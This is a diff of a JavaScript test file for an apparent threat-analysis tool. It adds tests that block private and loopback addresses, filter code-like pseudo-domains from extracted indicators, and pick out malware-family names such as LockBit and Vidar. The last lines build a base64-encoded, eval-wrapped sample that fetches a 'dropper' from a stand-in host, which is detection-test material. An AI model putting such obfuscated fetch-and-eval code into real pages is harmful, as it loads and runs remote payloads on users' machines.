@@ -18,6 +18,9 @@ assert.equal(sandboxUrlSafety('http://[::1]/').ok, false)
 assert.equal(sandboxUrlSafety('http://[::ffff:127.0.0.1]/').ok, false)
 assert.equal(sandboxUrlSafety('http://[64:ff9b::7f00:1]/').ok, false)
 assert.equal(sandboxResolvedAddressSafety([{ address: '10.0.0.8', family: 4 }]).ok, false, 'blocks hostnames resolving to private IPv4')
+assert.equal(sandboxResolvedAddressSafety([{ address: '192.168.1.10', family: 4 }]).ok, false)
+assert.equal(sandboxResolvedAddressSafety([{ address: '127.0.0.1', family: 4 }]).ok, false)
+assert.equal(sandboxResolvedAddressSafety([{ address: '::1', family: 6 }]).ok, false)
 assert.equal(sandboxResolvedAddressSafety([{ address: '::ffff:7f00:1', family: 6 }]).ok, false, 'blocks hostnames resolving to mapped private IPv6')
 assert.equal(sandboxResolvedAddressSafety([]).ok, false, 'fails closed when DNS resolution returns no usable addresses')
 assert.deepEqual(sandboxResolvedAddressSafety([{ address: '93.184.216.34', family: 4 }]), { ok: true })
@@ -27,11 +30,17 @@ assert(indicators.urls.includes('https://stage.example.net/a.js'), 'extracts ful
 assert(indicators.ips.includes('203.0.113.44'), 'extracts IPv4 indicators')
 assert(indicators.domains.includes('bad.example.net'), 'extracts domain indicators')
 assert(!extractIndicators('999.1.1.1').ips.includes('999.1.1.1'), 'rejects impossible IPv4 octets')
+const noisyIndicators = extractIndicators('https://payload.example/a document.createElement object.assign el.style 203.0.113.10')
+for (const pseudoDomain of ['document.createelement', 'object.assign', 'el.style']) {
+    assert(!noisyIndicators.domains.includes(pseudoDomain), `filters ${pseudoDomain} pseudo-domains`)
+}
 
 const associations = extractThreatAssociations('Tool output: campaign associated with LockBit ransomware and Cobalt Strike beacons.', 'tool_context')
 assert(associations.some(item => item.name === 'LockBit' && item.confidence === 'high'), 'extracts high-confidence ransomware context')
 assert(associations.some(item => item.name === 'Cobalt Strike'), 'extracts tool context')
 assert.equal(extractThreatAssociations('Article title: Vidar (26) woke up with a new name.', 'tool_context').length, 0, 'ignores bare provider-page name mentions')
+assert.equal(extractThreatAssociations('Vidar (26) woke up with a new name.', 'rendered_page').length, 0)
+assert(extractThreatAssociations('Security vendors detected Vidar malware family activity.', 'tool_context').some(item => item.name === 'Vidar'))
 
 const encoded = Buffer.from('fetch("https://payload.example.com/dropper"); document.write("stage");').toString('base64')
 const script = inspectScript({ src: '', inline: `eval(atob("${encoded}"));` }, 0)
